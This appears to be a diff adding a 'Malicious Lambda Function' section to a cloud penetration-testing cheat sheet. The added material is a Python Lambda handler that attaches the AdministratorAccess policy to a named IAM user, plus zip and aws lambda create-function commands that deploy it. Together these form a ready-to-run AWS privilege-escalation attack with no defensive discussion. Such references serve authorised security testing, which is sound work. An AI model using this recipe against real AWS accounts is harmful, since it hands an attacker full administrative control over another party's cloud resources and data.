@@ -452,6 +452,35 @@ $ aws lambda update-function-code --function-name <FUNCTION> --zip-file fileb://
 $ aws lambda update-function-configuration --function-name <FUNCTION> --environment "Variables={VAR=value}"
 ```
 
+#### Malicious Lambda Function
+
+```python3
+import boto3
+
+def lambda_handler(event, context):
+    iam = boto3.client('iam')
+    iam.attach_user_policy(
+        UserName='<USERNAME>',
+        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+    )
+    return "Policy attached!"
+```
+
+```console
+$ zip -r lambda_function.py.zip lambda_function.py
+```
+
+```console
+$ aws lambda create-function \
+  --function-name <FUNCTION> \
+  --runtime python3.9 \
+  --role <ROLE> \
+  --handler lambda_function.lambda_handler \
+  --zip-file fileb://lambda_function.py.zip \
+  --profile <PROFILE> \
+  --region <REGION>
+```
+
 ### EC2 Instance Enumeration
 
 #### List EC2 Instances
